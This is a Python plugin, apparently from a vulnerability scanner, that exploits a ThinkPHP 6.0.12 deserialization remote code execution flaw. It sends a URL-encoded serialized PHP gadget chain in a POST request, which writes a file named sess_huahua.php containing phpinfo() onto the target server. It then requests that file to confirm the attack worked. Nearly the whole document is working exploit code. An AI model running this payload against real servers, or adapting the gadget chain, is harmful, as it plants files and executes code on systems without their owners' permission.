#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'ThinkPHP 6.0.12 反序列化 RCE',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/'
  data = 'cmd=O%3A17%3A%22think%5Cmodel%5CPivot%22%3A4%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A15%3A%22think%5Croute%5CUrl%22%3A4%3A%7Bs%3A6%3A%22%00%2A%00url%22%3Bs%3A2%3A%22a%3A%22%3Bs%3A9%3A%22%00%2A%00domain%22%3Bs%3A27%3A%22%3C%3Fphp+phpinfo%28%29%3B+exit%28%29%3B+%3F%3E%22%3Bs%3A6%3A%22%00%2A%00app%22%3BO%3A16%3A%22think%5CMiddleware%22%3A1%3A%7Bs%3A7%3A%22request%22%3Bi%3A2333%3B%7Ds%3A8%3A%22%00%2A%00route%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A13%3A%22getDomainBind%22%3B%7Ds%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A21%3A%22League%5CFlysystem%5CFile%22%3A2%3A%7Bs%3A7%3A%22%00%2A%00path%22%3Bs%3A10%3A%22huahua.php%22%3Bs%3A13%3A%22%00%2A%00filesystem%22%3BO%3A25%3A%22think%5Csession%5Cdriver%5CFile%22%3A0%3A%7B%7D%7D%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22huahua%22%3B%7D%7D'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    res.close()
  except:
    pass
  try:
    resp = requests.get(url=url+'/sess_huahua.php',timeout=5,verify=False)
    if resp.status_code == 200 and "PHP Version" in resp.text:
      resp.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret